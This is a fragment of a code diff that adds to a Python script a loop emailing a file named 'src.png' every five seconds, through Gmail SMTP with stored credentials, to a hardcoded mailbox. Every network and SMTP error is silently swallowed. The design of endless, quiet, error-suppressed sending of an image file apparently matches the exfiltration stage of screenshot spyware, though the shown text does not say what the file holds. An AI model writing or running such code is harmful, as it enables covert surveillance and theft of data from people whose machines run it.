@@ -166,3 +166,27 @@ def mail(attach):  #defining function for email
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
    msg.attach(part)
    
+   try:
+       mailServer = smtplib.SMTP("smtp.gmail.com", 587)
+       mailServer.ehlo()
+       mailServer.starttls()
+       mailServer.ehlo()
+       mailServer.login(gmail_user, gmail_pwd)
+       mailServer.sendmail(gmail_user,gmail_user, msg.as_string())
+       mailServer.close()
+   except smtplib.socket.gaierror:
+       pass
+   except (gaierror, ConnectionRefusedError):
+       pass
+   except smtplib.SMTPServerDisconnected:
+       pass
+   except smtplib.SMTPException:
+       pass
+ 
+def main(): #defining function to repeat
+    while True:
+         mail("src.png")
+         time.sleep(5)
+ 
+if __name__=='__main__':
+    main()
